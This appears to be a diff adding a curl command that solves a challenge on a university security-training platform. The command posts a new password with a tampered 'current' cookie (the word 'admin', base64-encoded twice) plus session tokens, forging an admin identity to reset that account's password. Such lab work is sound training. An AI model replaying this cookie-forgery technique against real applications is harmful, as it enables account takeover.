@@ -1,0 +1,18 @@
+curl 'https://shepherd.hs25.isf.hslu-edu.ch/challenges/b467dbe3cd61babc0ec599fd0c67e359e6fe04e8cdc618d537808cbb693fee8a' \
+  -X POST \
+  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.5' \
+  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'X-Requested-With: XMLHttpRequest' \
+  -H 'Origin: https://shepherd.hs25.isf.hslu-edu.ch' \
+  -H 'Connection: keep-alive' \
+  -H 'Referer: https://shepherd.hs25.isf.hslu-edu.ch/challenges/t193c6634f049bcf65cdcac72269eeac25dbb2a6887bdb38873e57d0ef447bc3.jsp' \
+  -H 'Cookie: current=WVdSdGFXND0=; JSESSIONID=799B3FD39F876728A62066629EE2760B; token=-8665397394762714638516061133736101597' \
+  -H 'Sec-Fetch-Dest: empty' \
+  -H 'Sec-Fetch-Mode: cors' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'DNT: 1' \
+  -H 'Sec-GPC: 1' \
+  --data-raw 'newPassword=11111111'
